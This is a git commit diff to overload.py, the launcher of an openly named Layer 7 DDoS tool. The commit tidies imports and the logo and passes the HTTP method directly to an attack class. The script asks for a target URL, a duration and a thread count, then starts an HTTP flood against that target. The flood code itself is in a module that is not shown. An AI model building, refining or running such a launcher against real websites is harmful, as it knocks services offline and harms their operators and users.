a07154332b34dba44d38f0f3afcf2ef35b501b58
João Vitor <joaovitorsouza205@hotmail.com>
2022-10-01 22:37:41 -0300

    feat: removing unused library, passing the method type directly to the attack class

--- overload.py
+++ overload.py
@@ -2,55 +2,52 @@
 
 # Created by nuvem and tsk
 
-# Import modules
-import argparse
 import os
 import sys
 
 from colorama import Fore
 
-os.system("@cls & @title Overload DDOS Tool by: 7zx and 8fn & @color e")
-
-# Get the actual directory
+# Changing CWD to the canonical path of the file.
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
 
 try:
+
     import tools.addons.clean
-    import tools.addons.logo
-
-    # import tools.addons.winpcap
+    # Tries to download Wireshark if Windows OS is detected.
     import tools.addons.wireshark
-    from tools.crash import CriticalError
     from tools.method import AttackMethod
-except ImportError as err:
-    CriticalError("Failed to import some packages", err)
-    sys.exit(1)
 
-method = "HTTP"
-logo = """
- ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
-▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
-▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
-▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
-░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
-░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
-  ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
-░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
-    ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
-              ░                                               ░     
-"""
-CRED2 = "\33[91m"
+except ImportError as err:
+    from tools.crash import CriticalError
+
+    CriticalError("Failed to import some packages!", err)
+
 
 if __name__ == "__main__":
-    # Print help
-    os.system("cls" if os.name == "nt" else "clear")
+
+    logo = """
+  ▒█████   ██▒   █▓▓█████  ██▀███   ██▓     ▒█████   ▄▄▄      ▓█████▄ 
+  ▒██▒  ██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌
+  ▒██░  ██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌
+  ▒██   ██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄  ▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌
+  ░ ████▓▒░   ▒▀█░  ░▒████▒░██▓ ▒██▒░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ 
+  ░ ▒░▒░▒░    ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ 
+    ░ ▒ ▒░    ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒ 
+  ░ ░ ░ ▒       ░░     ░     ░░   ░   ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░ 
+      ░ ░        ░     ░  ░   ░         ░  ░    ░ ░        ░  ░   ░    
+                ░                                               ░     
+  """
+
+    CRED2 = "\33[91m"
     print(CRED2 + logo + CRED2)
     print("├───DDOS TOOL LAYER 7")
-    time = int(input(f"{Fore.RED}│   ├───TIME:{Fore.RESET}"))
-    threads = int(input(f"{Fore.RED}│   └───THREADS:{Fore.RESET}"))
-    target = str(input(f"{Fore.RED}│   └───URL:{Fore.RESET}"))
+
+    time = int(input(f"{Fore.RED}│   ├───TIME: {Fore.RESET}"))
+    threads = int(input(f"{Fore.RED}│   └───THREADS: {Fore.RESET}"))
+    target = str(input(f"{Fore.RED}│   └───URL: {Fore.RESET}"))
+
     with AttackMethod(
-        duration=time, name=method, threads=threads, target=target
+        duration=time, method_name="HTTP", threads=threads, target=target
     ) as Flood:
         Flood.Start()
 else:
